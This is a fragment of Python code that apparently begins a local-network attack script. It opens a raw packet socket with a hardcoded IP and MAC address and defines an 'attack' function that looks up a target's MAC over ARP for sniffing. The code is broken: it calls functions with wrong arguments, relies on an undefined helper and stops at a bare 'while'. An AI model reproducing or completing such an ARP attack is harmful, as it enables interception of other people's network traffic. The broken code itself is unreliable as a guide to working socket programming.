import socket
socket.if_indextoname('1')
 
# initialize 
def socket_init():
    ### create raw socket
    global s
    s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x0003))
    ### 
    ## bind raw socket
    global host_ip,host_mac,target_ip
    host_ip = '140.112.107.187'
    host_mac = '96:0f:cf:a8:8f:e4'
    s.bind((host_ip,0))
def attack(target_ip):
    #initialize
    global s,target_mac,dst_ip,dst_mac,src_ip,src_mac,data
    s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x0003))
    s.bind((host_ip,0))
    ######## sniffer
    target_mac = ARP_reply_get(target_ip)
    ########
    print(target_mac)
    while
